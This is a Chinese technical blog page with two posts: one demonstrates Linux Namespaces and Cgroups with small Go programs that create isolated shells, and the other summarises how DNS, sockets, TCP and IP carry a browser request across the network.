<p>假设我们成立了一家向外售卖计算资源的公司，用户购买了一个实例在运行自己的应用。如果某些用户能够进入到其他人的实例中，修改或关闭其他实例中应用的状态，那么就会导致不同用户之间相互影响；用户的某些操作可能需要 root 权限，假如我们给每个用户都赋予了 root 权限，那么我们的机器也就没有任何安全性可言了。使用 Namespace，Linux 可以做到 UID 级别的隔离，也就是说，UID 为 n 的用户在自己的 Namespace 中是有 root 权限的，但是在真实的物理机上，他仍然是 UID 为 n 的用户。</p>
<p>目前 Linux 共实现了 6 种不同的 Namespace。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>系统调用参数</th>
<th>内核版本</th>
</tr>
</thead>
<tbody><tr>
<td>Mount Namespace</td>
<td>CLONE_NEWNS</td>
<td>2.4.19</td>
</tr>
<tr>
<td>UTS Namespace</td>
<td>CLONE_NEWUTS</td>
<td>2.6.19</td>
</tr>
<tr>
<td>IPC Namespace</td>
<td>CLONE_NEWIPC</td>
<td>2.6.19</td>
</tr>
<tr>
<td>PID Namespace</td>
<td>CLONE_NEWPID</td>
<td>2.6.24</td>
</tr>
<tr>
<td>Network Namespace</td>
<td>CLONE_NEWNET</td>
<td>2.6.29</td>
</tr>
<tr>
<td>User Namespace</td>
<td>CLONE_NEWUSER</td>
<td>3.8</td>
</tr>
</tbody></table>
<h3 id="UTS-Namespace"><a href="#UTS-Namespace" class="headerlink" title="UTS Namespace"></a>UTS Namespace</h3><blockquote>
<p>UTS namespaces allow a single system to appear to have different host and domain names to different processes.</p>
</blockquote>
<p>UTS(UNIX Timesharing System) Namespace 可以用来隔离 nodename 和 domainname 两个系统标识。在 UTS Namespace 中，每个 Namespace 可以有自己的 hostname。</p>
<p>我们运行下面程序：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">"zsh"</span>)</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;</span><br><span class="line">        Cloneflags: syscall.CLONE_NEWUTS,</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码主要是通过系统调用 <code>clone</code>，并传入 <code>CLONE_NEWUTS</code> 作为参数创建一个新进程，并在新进程内运行 <code>zsh</code> 命令。在 Ubuntu 14.04 上运行这段代码，就可以进入一个交互环境，在环境中运行 <code>ps -af --forest</code> 就可以看到如下的进程树：</p>
<p><img src="/images/2018-08-05/uts-pstree.png" alt="UTS PS"></p>
<p>验证下父进程和子进程是否在同一个 UTS Namespace 中：</p>
<p><img src="/images/2018-08-05/uts-ns.png" alt="UTS NS"></p>
<p>可以看到他们的 UTS Namespace 的编号不同。因为 UTS Namespace 对 hostname 做了隔离，所以在这个环境内修改 hostname 不会影响外部主机。</p>
<p>在目前的 zsh 环境中我们修改 hostname 并打印:</p>
<p><img src="/images/2018-08-05/hostname-chuan.png" alt="hostname-chuan"></p>
<p>在宿主机上打印 hostname：</p>
<p><img src="/images/2018-08-05/hostname-main.png" alt="hostname-root"></p>
<p>可以看到，外部的 hostname 没有被内部的修改所影响。</p>
<h3 id="IPC-Namespace"><a href="#IPC-Namespace" class="headerlink" title="IPC Namespace"></a>IPC Namespace</h3><blockquote>
<p>IPC namespaces isolate processes from SysV style inter-process communication.</p>
</blockquote>
<p>IPC(Interprocess Communication) Namespace 用来隔离 System V IPC 和 POSIX message queues。每一个 IPC Namespace 都有自己的 System V IPC 和 POSIX message queue。</p>
<p>我们在上一段代码的基础上增加 <code>CLONE_NEWIPC</code> 标识，表示我们要创建 IPC Namespace。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">"zsh"</span>)</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;</span><br><span class="line">        Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC,</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在宿主器机查看并创建一个 message queue：</p>
<p><img src="/images/2018-08-05/ipc-main.png" alt="ipc-main"></p>
<p>运行代码并查看 message queue：</p>
<p><img src="/images/2018-08-05/ipc-chuan.png" alt="ipc-chuan"></p>
<h3 id="PID-Namespace"><a href="#PID-Namespace" class="headerlink" title="PID Namespace"></a>PID Namespace</h3><blockquote>
<p>The PID namespace provides processes with an independent set of process IDs (PIDs) from other namespaces.</p>
</blockquote>
<p>PID(Process ID) Namespace 可以用来隔离进程 ID。同一个进程在不同的 PID Namespace 中可以拥有不同的 PID。在 Docker Container 中，使用 <code>ps -ef</code> 可以看到启动容器的进程 PID 为 1，但是在宿主机上，该进程却又有不同的 PID。</p>
<p>继续在代码上添加 <code>CLONE_NEWPID</code> 为子进程创建 PID Namespace。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">"zsh"</span>)</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;</span><br><span class="line">        Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID,</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行代码，首先在宿主机上查看进程树：</p>
<p><img src="/images/2018-08-05/pid-main.png" alt="pid-main"></p>
<p>可以看到 zsh 的 PID 为 11321。在 Namespace 中打印进程 PID：</p>
<p><img src="/images/2018-08-05/pid-chuan.png" alt="pid-chuan"></p>
<p>可以看到，打印出的当前 Namespace 的 PID 为 1，也就是说 11321 的进程被映射到 Namespace 中后 PID 为 1。</p>
<h3 id="Mount-Namespace"><a href="#Mount-Namespace" class="headerlink" title="Mount Namespace"></a>Mount Namespace</h3><blockquote>
<p>Mount namespaces control mount points.</p>
</blockquote>
<p>Mount Namespace 用来隔离各个进程看到的挂载点视图。在不同的 Namespace 中，看到的挂载点文件系统层次是不一样的。在 Mount Namespace 中调用 <code>mount</code> 和 <code>unmount</code> 仅仅会影响当前 Namespace 内的文件系统，而对全局文件系统是没有影响的。</p>
<p>在代码中，我们继续加入 <code>CLONE_NEWNS</code> 标识。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">"zsh"</span>)</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;</span><br><span class="line">        Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS,</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先运行代码，然后查看 <code>/proc</code> 的文件内容：</p>
<p><img src="/images/2018-08-05/mount-main.png" alt="mount-main"></p>
<p>可以看到宿主机的 <code>/proc</code> 中文件较多，其中的数字是对应进程的相关信息。下面，将 <code>/proc</code> mount 到 Namespace 中。</p>
<p><img src="/images/2018-08-05/mount-chuan.png" alt="mount-chuan"></p>
<p>可以看到现在以 PID 命名的文件夹明显减少。下面使用 <code>ps -ef</code> 查看系统进程：</p>
<p><img src="/images/2018-08-05/mount-chuan-ps.png" alt="mount-chuan-ps"></p>
<p>可以看到，在当前的 Namespace 中，zsh 是 PID 为 1 的进程。这就说明当前 Namespace 中的 mount 和外部是隔离的，mount 操作没有影响到外部。Docker 的 volumn 正是利用了这个特性。</p>
<h3 id="User-Namespace"><a href="#User-Namespace" class="headerlink" title="User Namespace"></a>User Namespace</h3><blockquote>
<p>User namespaces are a feature to provide both privilege isolation and user identification segregation across multiple sets of processes.</p>
</blockquote>
<p>User Namespace 主要是隔离用户的用户组 ID。也就是说，一个进程的 User ID 和 Group ID 在 User Namespace 内外可以是不同的。比较常用的是，在宿主机上以一个非 root 用户运行创建一个 User Namespace，然后在 User Namespace 中被映射为了 root 用户。这意味着这个进程在 User Namespace 中有 root 权限，但是在宿主机上却没有 root 权限。</p>
<p>继续修改代码，添加 <code>CLONE_NEWUSER</code> 标识。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">"zsh"</span>)</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;</span><br><span class="line">    Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID |</span><br><span class="line">        syscall.CLONE_NEWNS | syscall.CLONE_NEWUSER,</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在宿主机上查看当前用户和用户组：</p>
<p><img src="/images/2018-08-05/user-main.png" alt="user-main"></p>
<p>接下来运行程序，并查看用户组：</p>
<p><img src="/images/2018-08-05/user-chuan.png" alt="user-chuan"></p>
<p>可以看到，UID 是不同的，说明 User Namespace 生效了。</p>
<h3 id="Network-Namespace"><a href="#Network-Namespace" class="headerlink" title="Network Namespace"></a>Network Namespace</h3><blockquote>
<p>Network namespaces virtualize the network stack. On creation a network namespace contains only a loopback interface.</p>
</blockquote>
<p>Network Namespace 用来隔离网络设置、IP 地址和端口号等网络栈的 Namespace。Network Namespace 可以让每个容器拥有自己独立的网络设备，而且容器内的应用可以绑定到自己的端口，每个 Namespace 的端口都不会有冲突。在宿主机搭建网桥后，就能很方便地实现容器之间的通信。</p>
<p>我们继续在代码基础上添加 <code>CLONE_NEWNET</code> 标识。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">"sh"</span>)</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;</span><br><span class="line">        Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID |</span><br><span class="line">        syscall.CLONE_NEWNS | syscall.CLONE_NEWUSER | syscall.CLONE_NEWNET,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先，在宿主机上查看自己的网络设备：</p>
<p><img src="/images/2018-08-05/network-main.png" alt="network-main"></p>
<p>可以看到在宿主机上有 eth0 和 lo 等网络设备。下面，运行程序，并运行 <code>ifconfig</code>：</p>
<p><img src="/images/2018-08-05/network-chuan.png" alt="network-chuan"></p>
<p>我们发现，在 Namespace 中什么网络设备都没有。这可以断定 Namespace 与宿主机之间的网络是处于隔离状态的。</p>
<h2 id="Cgroups"><a href="#Cgroups" class="headerlink" title="Cgroups"></a>Cgroups</h2><p>Linux Namespace 帮助进程隔离出自己的单独空间，而 Cgroups 则可以限制每个空间的大小。Cgroups 提供了对一组进程及将来子进程的资源限制、控制和统计的能力。</p>
<p>Cgroups 有三个组件：</p>
<ol>
<li>cgroup 负责对进程分组管理，一个 cgroup 包含一组进程并可以设置进程参数</li>
<li>subsystem 是一组资源控制模块，可以关联到 cgroup 上，并对 cgroup 中的进程做出相应限制。</li>
<li>hierarchy 可以把一组 cgroup 串成一个树状结构，这样 cgroup 可以做到继承。</li>
</ol>
<p>Cgroups 中的 hierarchy 是一种树状结构，Kernel 为了使得对 Cgroups 的配置更加直观，通过一个虚拟的树状文件系统配置 Cgroups 的，通过层级的目录虚拟出 cgroup 树。我们可以在系统上做实验：</p>
<ol>
<li><p>首先，创建并挂载一个 hierarchy<br><img src="/images/2018-08-05/cgroup-mount.png" alt="cgroup-mount"></p>
<ul>
<li><code>cgroup.clone_children</code>，<code>cpuset</code> 的 subsystem 会读取这个配置文件，如果这个值是 1，子 cgroup 才会继承父 cgroup 的 <code>cputset</code> 的配置</li>
<li><code>cgroup.procs</code> 是树中当前节点 cgroup 中的进程组 ID</li>
<li><code>notify_on_release</code> 和 <code>release_agent</code> 会一起使用。<code>notify_on_release</code> 标识当这个 cgroup 最后一个进程退出的时候是否执行了 <code>release_agent</code>；<code>release_agent</code> 使进程退出后自动清理掉不再使用的 cgroup</li>
<li><code>tasks</code> 标识该 cgroup 下的进程 ID，将进程 ID 写入 <code>tasks</code> 文件中，便会将相应进程加入到这个 cgroup 中</li>
</ul>
</li>
<li><p>在刚创建好的 hierarchy 上 cgroup 的根节点中拓展出两个子 cgroup<br><img src="/images/2018-08-05/cgroup-tree.png" alt="cgroup-tree"><br>可以看到在 cgroup 目录下创建文件夹的时候，Kernel 会把文件夹标记为子 cgroup，她们继承父 cgroup 的属性。</p>
</li>
<li><p>在 cgroup 中添加和移动进程只需要将进程 ID 写到或移动到 cgroup 节点的 <code>tasks</code> 文件中即可</p>
</li>
</ol>
<p><img src="/images/2018-08-05/cgroup-mv.png" alt="cgroup-mv"></p>
<p>这样，我们就把当前的 3217 进程加入到 cgroup-test:/cgroup-1 中了</p>
<ol start="4">
<li>通过 subsystem 限制 cgroup 中的进程的资源。我们使用系统为每个 subsystem 默认创建的 hierarchy，如 memory 的 hierarchy 来完成实验。</li>
</ol>
<p><img src="/images/2018-08-05/cgroup-mem.png" alt="cgroup-mem"></p>
<p><img src="/images/2018-08-05/cgroup-stress.png" alt="cgroup-stress"></p>
<p>可以看到系统总的内存为 2GB，其中 stess 只能占用到 5% 左右，也就是 100MB。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2018/04/09/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/04/09/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/" class="post-title-link" itemprop="url">网络是如何连接的</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2018-04-10 02:16:23" itemprop="dateCreated datePublished" datetime="2018-04-10T02:16:23+08:00">2018-04-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2018/04/09/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/04/09/网络是怎样连接的/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>网络是个巨大而复杂的系统，在我们尝试了解网络如何工作的时候，首先需要从高空俯瞰网络的全貌，否则如果过早地沉溺于细节，就很难理解每一种网络技术背后的意义；如果无法理解技术的本质意义，就只能停留在死记硬背的程度，无法做到实际运用。当年在课上学习了计算机网络，课本上的内容基本都仅仅用来应付考试和求职面试了，而没有真正内化为自己的实力。最近朋友推荐了《网路是如何连接的》，日本技术人员的书从来都以知识面广、细致周全著称，所以我希望抛开学院派的教条，理解网络的全貌。</p>
<h2 id="网络的全貌"><a href="#网络的全貌" class="headerlink" title="网络的全貌"></a>网络的全貌</h2><p>对网络的探索之旅从在浏览器地址框输入网址开始，随后浏览器解析网址并利用 DNS 服务获取域名对应的服务器 IP 地址，为了发送数据到服务器，浏览器委托系统的网络协议栈将消息打包并加上目的地址等控制信息，然后协议栈将数据包交给主机网卡，主机网卡将数据包转换为比特流发送到服务器。主机通过光纤等线路接入网络运营商，网络运营商对比特流进行分拣，再通过骨干网络的路由器的不断接力将信息最终传递到 Web 服务器。通过骨干网络后，网络包抵达 Web 服务器，服务器的防火墙将对包进行检查并决定是否放行。信息包在通过防火墙后，可能还会遇到缓存和负载均衡器，最终被服务器处理。在服务器中，数据包被还原成为原始的请求信息，并通过服务器主机的协议栈交给程序，服务器程序将响应数据按同样的流程回传给客户端浏览器。最终浏览器得以将响应信息渲染为网页。</p>
<h2 id="浏览器发送请求"><a href="#浏览器发送请求" class="headerlink" title="浏览器发送请求"></a>浏览器发送请求</h2><p>在地址框输入网址后，浏览器首先会解析 URL 得到访问方法（HTTP，FTP)、域名、端口号和文件路径。之后，浏览器生成符合 HTTP 格式的请求信息。</p>
<p>生成 HTTP 消息之后，浏览器需要委托操作系统将消息传递到服务器，为了发送消息，操作系统需要知道服务器的 IP 地址。因此，浏览器会通过请求 DNS 服务器来获取服务器的 IP 地址。在主机中，请求 DNS 服务器查询 IP 地址的功能通常包含在操作系统的 <code>Socket</code> 库中。浏览器调用 <code>Socket</code> 库中的解析器（resolver）完成 IP 地址的查询。</p>
<blockquote>
<p><code>Socket</code> 是调用网络功能的程序组件集合。</p>
</blockquote>
<p>与浏览器一样，解析器在生成 DNS 请求后也需要委托操作系统的网络协议栈发送请求。从这里我们也可以看出，委托协议栈发送消息是一个通用的过程，与具体应用无关，这体现了程序设计上的<code>解耦合</code>原则。</p>
<p>DNS 系统是典型的、非常成功的分布式系统。在收到客户端发出的 IP 地址解析请求后，如果本地没有保存域名对应的 IP 地址，DNS 服务器会按照树形结构不断向上级 DNS 服务器查询，直到顺藤摸瓜找到 IP 地址或确认不存在该域名对应的 IP 地址。</p>
<p>在查询到服务器的 IP 地址，并生成 HTTP 请求内容后，浏览器则会委托系统协议栈完成数据的发送。</p>
<h2 id="协议栈发送数据"><a href="#协议栈发送数据" class="headerlink" title="协议栈发送数据"></a>协议栈发送数据</h2><p>委托协议栈发送数据同样通过调用 <code>Socket</code> 库来完成。协议栈通过 TCP 协议发送数据包裹四个阶段：</p>
<ol>
<li>创建套接字</li>
<li>连接服务器</li>
<li>收发数据</li>
<li>断开连接并删除套接字</li>
</ol>
<p>协议栈的内部结构为：</p>
<p><img src="/images/2018-3-31/protocol_stack.png" alt="协议栈内部结构"></p>
<p>在协议栈中，上面的部分想下面的部分委派工作，下面的部分接受委派并实际执行。所以，当调用 <code>Socket</code> 库时，实际的工作会有操作系统的协议栈完成。协议栈中的 <code>TCP</code> 和 <code>UDP</code> 分别都使用了 <code>IP</code> 协议，最终 <code>IP</code> 协议通过网卡驱动程序使用网卡实际发送数据。</p>
<blockquote>
<p>协议栈是根据套接字中记录的控制信息来工作的</p>
</blockquote>
<p>套接字本身是一个概念，而用于控制通信操作的控制信息构成了套接字的实体，协议栈在执行操作时需要参阅套接字中的控制信息。我们在系统中使用 <code>netstat</code> 命令就可以看到系统中当前活跃地套接字。</p>
<p><img src="/images/2018-3-31/netstat.png" alt="enter image description here"></p>
<p>当浏览器调用<code>Socket</code>库中 <code>socket</code>、<code>connect</code>、<code>write</code>、<code>read</code>、<code>close</code>等操作时，应用程序与Web 服务器的交互可以被总结为下图：</p>
<p><img src="/images/2018-3-31/socket.png" alt="enter image description here"></p>
<h3 id="创建套接字"><a href="#创建套接字" class="headerlink" title="创建套接字"></a>创建套接字</h3><p>调用 <code>socket</code> 申请创建套接字。协议栈首先分配用于存放套接字所需的内存空间，并写入初始状态。然后，将该套接字的描述符返回给应用程序。收到描述符后，应用程序在进行收发数据委托时就需要提供这个描述符。由于套接字中记录了通信双方的信息以及通信处于怎样的状态，所以只要通过描述符确定了套接字，协议栈就能获取所有信息。</p>
<h3 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h3><p>创建套接字后，应用程序调用 <code>connect</code> 将本地套接字与服务器套接字进行连接。所谓“连接”，实际上是通信双方交换控制信息。在套接字创建结束后，并没有保存任何信息，也不知道目标通信对象是谁；而服务器端也同样不知道将要和那一台主机通信。所以，客户端和服务器端需要通过“连接”来做好双方通信的准备。</p>
<p>连接过程中需要的控制信息有两类：</p>
<ol>
<li>数据包头部信息（如 TCP 数据包头部）</li>
<li>套接字中记录的信息</li>
</ol>
<p>“连接”过程由应用程序调用 <code>connect</code> 函数开始。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(sockfd, socket_addr, socket_port)</span><br></pre></td></tr></table></figure>

<p>该调用将服务器的 IP 地址和端口号传递给协议栈中的 TCP 模块，然后 TCP 模块会用过 IP 协议于对应的服务器端的 TCP 模块交换控制信息。首先，客户端先创建一个包含表示开始数据收发操作的控制信息的头部，将 SYN 设为1，并设置适当窗口大小等。当头部创建好之后，TCP 模块委托 IP 模块进行发送到服务器端的 TCP 模块。之后，服务器的 TCP 模块返回响应，并将头部中 ACK 设置为1。接下来，客户端收到响应，连接被正确建立。这也就是我们知道的“TCP三次握手”。</p>
<p>建立连接后，控制流程被交回到应用程序。</p>
<h3 id="收发数据"><a href="#收发数据" class="headerlink" title="收发数据"></a>收发数据</h3><p>收到数据的过程从应用程序调用 <code>write</code> 把数据交给协议栈开始。对于协议栈来说，要发送的数据就是一定长度的二进制比特流。在发送数据之前，协议栈会首先将数据保存在发送缓冲区中，等到缓冲区满，或者达到一定的等待时间后就才发送。但是缓冲区中信息的长度和等待时间是矛盾的，如果长度优先，那么网络利用效率会提高，但是可能因为等待缓冲区满而造成延迟；如果时间优先，那么等待时间变少，网络利用效率又会降低。TCP 协议的规格没有规定如何实现数据长度和等待时间的平衡，所以不同平台的做法会有差异。</p>
<p>TCP 在协议在收发数据时会对较大的包进行拆分，并使用序号和 ACK 的保证信息发送的完成，并能在客户端和服务器之间实现全双工通信。首先，客户端在连接时计算出发送数据到服务器时的序号初始值，并将初始值发送个服务器；服务器根据初始值计算 ACK 号并返回给客户端；同时，服务器也计算出与客户端通信使用的初始值，并发送给客户端；同样客户端也需要根据服务器发来的初始值计算 ACK 号并返回。</p>
<p>为了适当的设置 ACK 的超时等待时间，TCP 采用了动态调整等待时间的方法，这个时间根据 ACK 号返回所需的时间来判断。若返回变慢，则延长等待时间，若变快，而减少等待时间。为了在等待 ACK 时不浪费计算资源，TCP 使用滑动窗口方法来管理数据发送和 ACK 的操作。接收方在收到数据包后，会根据序号将数据包合并，仅仅确认最后一个收到的数据包的序号，这样大大缓解的出现网络拥挤的可能。</p>
<p>在发送消息后，应用程序调用 <code>read</code> 来委托协议栈获取响应消息。和发送数据一样，接收数据也同样需要将数据保存在缓冲区，在等待收到数据期间，协议栈会将应用程序挂起，等到收到响应消息后再继续执行。</p>
<h3 id="断开连接并删除套接字"><a href="#断开连接并删除套接字" class="headerlink" title="断开连接并删除套接字"></a>断开连接并删除套接字</h3><p>在客户端与服务器之间断开连接的过程则就是我们熟知的 TCP “四次挥手”的过程。首先由客户端生成 TCP 头部，将 FIN 置为 1 发送给服务器，服务器返回确认；然后再由服务器生成 TCP 头部，置控制信息 FIN 为 1 发送给客户端，最后客户端返回确认。</p>
<p>在断开连接之后，原来的通信使用的套接字就不会再使用了。但是为了防止误操作，客户端或服务器会等待一段时间之后才真正删除套接字。</p>
<h3 id="IP-协议发送数据包"><a href="#IP-协议发送数据包" class="headerlink" title="IP 协议发送数据包"></a>IP 协议发送数据包</h3><blockquote>
<p>IP 协议的职责仅仅是将委托的信息打包送到对方手里，或者接收对方发来的数据包。</p>
</blockquote>
<p>IP 协议发送数据包的起点是 TCP 模块委托 IP 模块发送数据包的操作。TCP 模块在 TCP 分组前添加上 TCP 头部，然后整个传给 IP 模块。收到委托后，IP 模块会 TCP 分组当做整块数据，并在前面加上 IP 头部和 MAC 头部。IP 头部包含发往目的地所需要的信息，MAC 头部包含通过以太网将包传输至最近的路由器所需要的控制信息。其中的 MAC 头部中的目的 MAC 地址通过向网络广播 ARP 请求来获得。接下来，封装好的包会被交给网络硬件，如网卡。通过网卡将信息转化为点信号或光信号，并通过网线发送出去，然后这些信号就会到达集线器、路由器等设备，再由转发设备一步一步地送达接收方。</p>
